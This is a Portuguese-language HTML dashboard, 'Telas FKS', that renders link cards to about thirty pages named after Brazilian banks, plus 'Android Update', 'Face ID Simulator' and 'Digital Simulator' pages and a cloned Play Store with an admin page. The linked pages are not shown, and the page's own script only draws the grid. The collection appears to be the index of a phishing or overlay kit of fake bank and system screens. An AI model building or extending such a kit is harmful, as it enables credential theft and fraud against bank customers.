<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Telas FKS - Painel</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background:#f0f2f5; color:#202124; padding:24px; }
h1 { font-size:24px; margin-bottom:4px; }
.sub { color:#5f6368; font-size:14px; margin-bottom:24px; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:12px; }
.card { background:#fff; border-radius:12px; padding:16px; text-align:center; text-decoration:none; color:inherit; border:1px solid #e8eaed; transition:box-shadow .15s, transform .15s; display:flex; flex-direction:column; align-items:center; gap:8px; }
.card:hover { box-shadow:0 4px 12px rgba(0,0,0,.1); transform:translateY(-2px); }
.card .emoji { font-size:36px; line-height:1; }
.card .name { font-size:14px; font-weight:500; }
.card .path { font-size:11px; color:#5f6368; word-break:break-all; }
.section { margin-bottom:32px; }
.section h2 { font-size:18px; margin-bottom:12px; color:#1a73e8; }
</style>
</head>
<body>
<h1>📱 Telas FKS</h1>
<p class="sub">Painel unificado de todas as telas - clique para abrir</p>

<div class="section">
<h2>🏦 Bancos</h2>
<div class="grid" id="bankGrid"></div>
</div>

<div class="section">
<h2>🛠️ Utilitários</h2>
<div class="grid" id="utilGrid"></div>
</div>

<div class="section">
<h2>📦 Play Store</h2>
<div class="grid" id="playGrid"></div>
</div>

<script>
var banks = [
  {name:"AGI", file:"AGI.html", emoji:"🏦"},
  {name:"BANESTES", file:"BANESTES.html", emoji:"🏦"},
  {name:"BANRISUL", file:"BANRISUL.html", emoji:"🏦"},
  {name:"BB", file:"BB.html", emoji:"🏦"},
  {name:"BMG", file:"BMG.html", emoji:"🏦"},
  {name:"BRADESCO", file:"BRADESCO.html", emoji:"🏦"},
  {name:"BRB", file:"BRB.html", emoji:"🏦"},
  {name:"BTG", file:"BTG.html", emoji:"🏦"},
  {name:"BV", file:"BV.html", emoji:"🏦"},
  {name:"C6", file:"C6.html", emoji:"🏦"},
  {name:"CAIXA", file:"CAIXA.html", emoji:"🏦"},
  {name:"INTER", file:"INTER.html", emoji:"🏦"},
  {name:"ITAU", file:"ITAU.html", emoji:"🏦"},
  {name:"ITI", file:"ITI.html", emoji:"🏦"},
  {name:"MP", file:"MP.html", emoji:"🏦"},
  {name:"NEON", file:"NEON.html", emoji:"🏦"},
  {name:"NEXT", file:"NEXT.html", emoji:"🏦"},
  {name:"NOMAD", file:"NOMAD.html", emoji:"🏦"},
  {name:"NUBANK", file:"NUBANK.html", emoji:"🏦"},
  {name:"ORIGINAL", file:"ORIGINAL.html", emoji:"🏦"},
  {name:"PAGBANK", file:"PAGBANK.html", emoji:"🏦"},
  {name:"PAN", file:"PAN.html", emoji:"🏦"},
  {name:"PICPAY", file:"PICPAY.html", emoji:"🏦"},
  {name:"SAFRA", file:"SAFRA.html", emoji:"🏦"},
  {name:"SANTANDER", file:"SANTANDER.html", emoji:"🏦"},
  {name:"SICOOB", file:"SICOOB.html", emoji:"🏦"},
  {name:"SICREDI", file:"SICREDI.html", emoji:"🏦"},
  {name:"STONE", file:"STONE.html", emoji:"🏦"},
  {name:"WILL", file:"WILL.html", emoji:"🏦"},
  {name:"XP", file:"XP.html", emoji:"🏦"},
];

var utils = [
  {name:"Android Update", file:"android-update.html", emoji:"📲"},
  {name:"Digital Simulator", file:"digital-simulator.html", emoji:"🖥️"},
  {name:"Face ID Simulator", file:"face-id-simulator.html", emoji:"😀"},
];

var playItems = [
  {name:"Play Store - Kingshot", file:"kingshot-clone/public/index.html", emoji:"▶️"},
  {name:"Admin - Play Store", file:"kingshot-clone/public/admin-static.html", emoji:"⚙️"},
];

function renderGrid(items, gridId) {
  var grid = document.getElementById(gridId);
  grid.innerHTML = items.map(function(item) {
    return '<a class="card" href="' + item.file + '" target="_blank"><div class="emoji">' + item.emoji + '</div><div class="name">' + item.name + '</div><div class="path">' + item.file + '</div></a>';
  }).join('');
}

renderGrid(banks, 'bankGrid');
renderGrid(utils, 'utilGrid');
renderGrid(playItems, 'playGrid');
</script>
</body>
</html>
